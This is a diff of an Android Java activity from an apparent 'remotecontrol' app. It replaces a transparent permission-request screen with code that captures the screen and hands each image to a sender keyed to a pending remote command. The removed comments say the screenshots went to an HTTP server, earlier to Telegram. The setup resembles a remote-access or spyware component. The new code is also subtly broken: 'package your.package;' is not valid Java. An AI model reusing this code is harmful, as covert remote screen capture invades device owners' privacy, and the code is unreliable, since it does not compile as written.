@@ -1,49 +1,131 @@
-package com.remotecontrol;
+// app/src/main/java/your/package/ScreenCaptureRequestActivity.java
+
+package your.package;
 
 import android.app.Activity;
-import android.content.Intent;
-import android.media.projection.MediaProjectionManager;
+import android.graphics.Bitmap;
+import android.graphics.PixelFormat;
+import android.media.Image;
+import android.media.ImageReader;
+import android.media.projection.MediaProjection;
 import android.os.Bundle;
+import android.util.DisplayMetrics;
 import android.util.Log;
+import android.view.WindowManager;
+import android.hardware.display.DisplayManager;
+import android.hardware.display.VirtualDisplay;
 
-/**
- * Прозрачная Activity — запрашивает разрешение MediaProjection
- * и передаёт результат в ScreenCaptureService.
- * chatId убран — скриншот уходит на HTTP сервер, не в Telegram.
- */
+import java.nio.ByteBuffer;
+
 public class ScreenCaptureRequestActivity extends Activity {
 
-    private static final String TAG = "SCRequestActivity";
-    private static final int REQ_MEDIA_PROJECTION = 1001;
+    public static ScreenCaptureSender sender;
+    public static int pendingCommandId = -1;
+    public static MediaProjection mediaProjection;
+
+    private ImageReader imageReader;
+    private VirtualDisplay virtualDisplay;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
 
-        MediaProjectionManager mpm =
-                (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
+        try {
+            if (mediaProjection == null) {
+                Log.e("ScreenCapture", "MediaProjection is null");
+                finish();
+                return;
+            }
 
-        if (mpm != null) {
-            startActivityForResult(mpm.createScreenCaptureIntent(), REQ_MEDIA_PROJECTION);
-        } else {
-            Log.e(TAG, "MediaProjectionManager недоступен");
+            startCapture();
+
+        } catch (Exception e) {
+            Log.e("ScreenCapture", "onCreate error", e);
             finish();
         }
     }
 
-    @Override
-    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
-        if (requestCode == REQ_MEDIA_PROJECTION) {
-            if (resultCode == Activity.RESULT_OK && data != null) {
-                Log.i(TAG, "Разрешение MediaProjection получено");
-                Intent serviceIntent = new Intent(this, ScreenCaptureService.class);
-                serviceIntent.putExtra(ScreenCaptureService.EXTRA_RESULT_CODE, resultCode);
-                serviceIntent.putExtra(ScreenCaptureService.EXTRA_RESULT_DATA, data);
-                startForegroundService(serviceIntent);
-            } else {
-                Log.w(TAG, "Разрешение MediaProjection отклонено");
-            }
+    private void startCapture() {
+        try {
+            WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
+            DisplayMetrics metrics = new DisplayMetrics();
+            wm.getDefaultDisplay().getRealMetrics(metrics);
+
+            int width = metrics.widthPixels;
+            int height = metrics.heightPixels;
+            int density = metrics.densityDpi;
+
+            imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
+
+            virtualDisplay = mediaProjection.createVirtualDisplay(
+                    "screen_capture",
+                    width,
+                    height,
+                    density,
+                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
+                    imageReader.getSurface(),
+                    null,
+                    null
+            );
+
+            imageReader.setOnImageAvailableListener(reader -> {
+                Image image = null;
+
+                try {
+                    image = reader.acquireLatestImage();
+                    if (image == null) return;
+
+                    Image.Plane[] planes = image.getPlanes();
+                    ByteBuffer buffer = planes[0].getBuffer();
+
+                    int pixelStride = planes[0].getPixelStride();
+                    int rowStride = planes[0].getRowStride();
+                    int rowPadding = rowStride - pixelStride * width;
+
+                    Bitmap bitmap = Bitmap.createBitmap(
+                            width + rowPadding / pixelStride,
+                            height,
+                            Bitmap.Config.ARGB_8888
+                    );
+
+                    bitmap.copyPixelsFromBuffer(buffer);
+
+                    Bitmap cropped = Bitmap.createBitmap(bitmap, 0, 0, width, height);
+
+                    sender.send(cropped, pendingCommandId);
+
+                    bitmap.recycle();
+
+                } catch (Exception e) {
+                    Log.e("ScreenCapture", "capture error", e);
+                } finally {
+
+                    try {
+                        if (image != null) image.close();
+                    } catch (Exception e) {
+                        Log.e("ScreenCapture", "image close error", e);
+                    }
+
+                    try {
+                        if (imageReader != null) imageReader.close();
+                    } catch (Exception e) {
+                        Log.e("ScreenCapture", "reader close error", e);
+                    }
+
+                    try {
+                        if (virtualDisplay != null) virtualDisplay.release();
+                    } catch (Exception e) {
+                        Log.e("ScreenCapture", "vd release error", e);
+                    }
+
+                    finish();
+                }
+
+            }, null);
+
+        } catch (Exception e) {
+            Log.e("ScreenCapture", "startCapture error", e);
+            finish();
         }
-        finish();
     }
 }
